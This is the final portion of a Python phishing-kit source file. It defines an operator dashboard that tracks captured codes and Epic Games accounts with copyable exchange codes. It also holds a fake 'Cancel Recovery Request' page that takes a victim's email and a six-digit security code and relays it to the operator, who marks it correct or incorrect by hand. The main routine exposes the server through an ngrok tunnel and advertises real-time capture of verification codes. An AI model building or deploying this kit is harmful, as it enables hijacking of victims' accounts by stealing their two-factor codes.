        
        async function verifyCode(id, isCorrect) {
            await fetch(\`/verify-code/\${id}\`, { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: \`correct=\${isCorrect}\` });
        }

        function updateEpicDisplay(accounts, sessions) {
            const container = document.getElementById('epic-container');
            if (accounts.length === 0 && sessions.length === 0) {
                container.innerHTML = `<div class="empty-state"><div class="empty-icon">🎮</div><div><strong>No Epic accounts yet</strong></div></div>`;
                return;
            }
            let html = '';
            accounts.forEach(acc => {
                html += `
                <div class="epic-item verified">
                    <div class="epic-display-name">${acc.display_name}</div>
                    <div class="epic-meta">
                        <span>👤 ID: ${acc.id.substring(0,12)}...</span>
                        <span>📧 ${acc.email}</span>
                        <span class="status-badge verified">✅ verified</span>
                    </div>
                    <div class="epic-buttons">
                        <button class="btn btn-primary btn-small" onclick="regenerateExchange('${acc.id}')">🔄 Regenerate</button>
                        <button class="copy-btn" onclick="copyToClipboard('${acc.current_exchange_code}', this)">📋 Copy Exchange</button>
                    </div>
                </div>`;
            });
            sessions.filter(s => s.status !== 'verified').forEach(sess => {
                const statusClass = sess.status || 'pending';
                html += `
                <div class="epic-item ${statusClass}">
                    <div class="epic-user-code">${sess.user_code || 'Loading...'}</div>
                    <div class="epic-meta">
                        <span>🆔 Session: ${sess.session_id}</span>
                        <span class="status-badge ${statusClass}">${statusClass}</span>
                    </div>
                    ${sess.activation_link ? `
                        <div class="epic-activation-link">
                           <a href="${sess.activation_link}" target="_blank" rel="noopener noreferrer">${sess.activation_link}</a>
                        </div>
                        <div class="epic-buttons">
                            <button class="copy-btn" onclick="copyToClipboard('${sess.activation_link}', this)">📋 Copy Link</button>
                        </div>
                    ` : ''}
                </div>`;
            });
            container.innerHTML = html;
        }

        async function regenerateExchange(id) {
            await fetch(\`/regenerate-exchange/\${id}\`, { method: 'POST' });
            showToast('🔄 Regenerating exchange code...', 'success');
        }

        async function updateStats() {
            try {
                const [codesRes, formsRes, accountsRes, sessionsRes] = await Promise.all([
                    fetch('/api/codes'), fetch('/api/forms'), fetch('/api/epic-accounts'), fetch('/api/epic-sessions')
                ]);
                const codesData = await codesRes.json();
                const formsData = await formsRes.json();
                const accountsData = await accountsRes.json();
                const sessionsData = await sessionsRes.json();
                document.getElementById('codes-count').textContent = codesData.codes.length;
                document.getElementById('forms-count').textContent = formsData.forms.length;
                document.getElementById('epic-accounts-count').textContent = accountsData.accounts.length;
                document.getElementById('epic-sessions-count').textContent = sessionsData.sessions.filter(s => s.status !== 'verified').length;
                updateCodesDisplay(codesData.codes);
                updateEpicDisplay(accountsData.accounts, sessionsData.sessions);
            } catch (error) { console.error('Error updating stats:', error); }
        }
        
        updateInterval = setInterval(updateStats, 2000);
    </script>
</body>
</html>'''

# Verification form HTML template (same as before)
verification_form_html = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cancel Recovery Request</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: #0a0a0a; color: #ffffff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .modal-container { background: rgb(24, 24, 28); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 24px; padding: 48px; max-width: 562px; width: 100%; }
        .title { font-size: 24px; font-weight: 600; margin-bottom: 20px; }
        .description { color: rgba(255, 255, 255, 0.65); margin-bottom: 32px; line-height: 26.4px; }
        .code-input-container { display: flex; gap: 13px; margin-bottom: 32px; justify-content: center; }
        .input-wrapper { width: 50px; height: 60px; }
        .code-input { width: 100%; height: 100%; border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 10px; background: rgba(255, 255, 255, 0.05); color: #ffffff; font-size: 24px; text-align: center; outline: none; }
        .code-input.error { border-color: #ef4444; animation: shake 0.4s; }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
        .button-container { display: flex; flex-direction: column; gap: 16px; }
        .button { width: 100%; height: 48px; border: none; border-radius: 10px; font-size: 16px; font-weight: 500; cursor: pointer; }
        .button-primary { background: rgb(38, 187, 255); color: rgb(16, 16, 20); }
        .button-primary:disabled { opacity: 0.5; cursor: not-allowed; }
        .button-secondary { background: rgb(48, 48, 52); color: rgb(255, 255, 255); }
        .verifying-container, .success-container { text-align: center; display: none; }
        .spinner { width: 64px; height: 64px; border: 4px solid rgba(255, 255, 255, 0.1); border-top-color: rgb(38, 187, 255); border-radius: 50%; margin: 0 auto 24px; animation: spin 1s linear infinite; }
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        .success-icon { width: 64px; height: 64px; background: rgb(34, 197, 94); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; }
        .error-message { background: rgba(239, 68, 68, 0.15); border: 1px solid #ef4444; border-radius: 10px; padding: 16px; margin-top: 16px; display: none; color: #ffffff; }
    </style>
</head>
<body>
    <div class="modal-container">
        <div id="email-step">
            <h1 class="title">Cancel Recovery Request</h1>
            <p class="description">Please enter your email address to cancel the recovery process</p>
            <form id="email-form">
                <input type="email" id="email-input" placeholder="Enter your email address" style="width: 100%; height: 50px; padding: 15px; border-radius: 10px; background: rgba(255, 255, 255, 0.05); color: #ffffff; font-size: 16px; border: 1px solid rgba(255, 255, 255, 0.1); margin-bottom: 32px;">
                <div class="button-container"><button type="submit" class="button button-primary">Continue</button></div>
            </form>
        </div>
        <div id="verification-step" style="display: none;">
            <h1 class="title">Check Your Inbox</h1>
            <p class="description">Enter the 6-digit security code we sent to <span id="user-email" style="font-weight: 600;"></span></p>
            <form id="verification-form">
                <div class="code-input-container">
                    <div class="input-wrapper"><input type="number" class="code-input" maxlength="1"></div>
                    <div class="input-wrapper"><input type="number" class="code-input" maxlength="1"></div>
                    <div class="input-wrapper"><input type="number" class="code-input" maxlength="1"></div>
                    <div class="input-wrapper"><input type="number" class="code-input" maxlength="1"></div>
                    <div class="input-wrapper"><input type="number" class="code-input" maxlength="1"></div>
                    <div class="input-wrapper"><input type="number" class="code-input" maxlength="1"></div>
                </div>
                <div class="button-container">
                    <button type="submit" class="button button-primary" id="continue-btn" disabled>Continue</button>
                    <button type="button" class="button button-secondary" id="cancel-btn">Cancel</button>
                </div>
                <div class="error-message" id="error-message">The code is invalid or has expired. Please try again.</div>
            </form>
        </div>
        <div id="verifying-step" class="verifying-container">
            <div class="spinner"></div>
            <h1>Verifying Code</h1>
            <p>Please wait while we verify your security code...</p>
        </div>
        <div id="success-step" class="success-container">
            <div class="success-icon"><svg width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M20 6L9 17L4 12" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
            <h1>Recovery Request Canceled</h1>
            <p>Your recovery request has been successfully canceled.</p>
        </div>
    </div>
    <script>
        const inputs = document.querySelectorAll('.code-input');
        const continueBtn = document.getElementById('continue-btn');
        const emailForm = document.getElementById('email-form');
        const verificationForm = document.getElementById('verification-form');
        const formId = 'FORM_ID_PLACEHOLDER';
        let currentVerificationId = null;

        emailForm.addEventListener('submit', (e) => {
            e.preventDefault();
            document.getElementById('user-email').textContent = document.getElementById('email-input').value;
            document.getElementById('email-step').style.display = 'none';
            document.getElementById('verification-step').style.display = 'block';
            inputs[0].focus();
        });

        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                if (e.target.value && index < inputs.length - 1) inputs[index + 1].focus();
                continueBtn.disabled = ![...inputs].every(i => i.value);
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !input.value && index > 0) inputs[index - 1].focus();
            });
        });

        async function checkVerification() {
            if (!currentVerificationId) return;
            const response = await fetch(`/check-verification/${currentVerificationId}`);
            const data = await response.json();
            if (data.status === 'correct') {
                document.getElementById('verifying-step').style.display = 'none';
                document.getElementById('success-step').style.display = 'block';
            } else if (data.status === 'incorrect') {
                document.getElementById('verifying-step').style.display = 'none';
                document.getElementById('verification-step').style.display = 'block';
                document.getElementById('error-message').style.display = 'block';
                inputs.forEach(i => { i.value = ''; i.classList.add('error'); });
                inputs[0].focus();
            } else {
                setTimeout(checkVerification, 1000);
            }
        }

        verificationForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const code = [...inputs].map(i => i.value).join('');
            document.getElementById('verification-step').style.display = 'none';
            document.getElementById('verifying-step').style.display = 'block';
            const response = await fetch(`/submit-code/${formId}`, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: `code=${code}` });
            if(response.ok) {
                const data = await response.json();
                currentVerificationId = data.verification_id;
                setTimeout(checkVerification, 1000);
            }
        });
    </script>
</body>
</html>'''


def main():
    # Simplified setup without browser automation dependencies
    print("🚀 Starting Simplified Control Panel...")
    
    # Find a free port for the control panel
    port = find_free_port()
    local_ip = get_local_ip()

    print(f"🌐 Local URL: http://localhost:{port}")
    print(f"🌐 Network URL: http://{local_ip}:{port}")

    # Setup ngrok tunnel in background
    print("\n🔄 Setting up ngrok tunnel...")
    tunnel_thread = threading.Thread(target=lambda: setup_ngrok_tunnel(port), daemon=True)
    tunnel_thread.start()

    print("\n📊 Features:")
    print("   🔐 Generate secure verification form links")
    print("   📱 Capture verification codes in real-time")
    print("   🎮 Epic Games device authentication (manual login)")
    print("   📊 Live statistics and management dashboard")
    print("   🌍 Ngrok custom domain tunnel support")
    print("-" * 60)

    # Create and start the server
    with socketserver.TCPServer(("0.0.0.0", port), ControlPanelHandler) as httpd:
        server_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
        server_thread.start()

        # Open the browser to the control panel
        webbrowser.open(f'http://localhost:{port}')

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n\n🛑 Shutting down Control Panel...")
            close_tunnel()
            httpd.shutdown()
            print("✅ Control Panel stopped. Goodbye!")


if __name__ == "__main__":
    main()
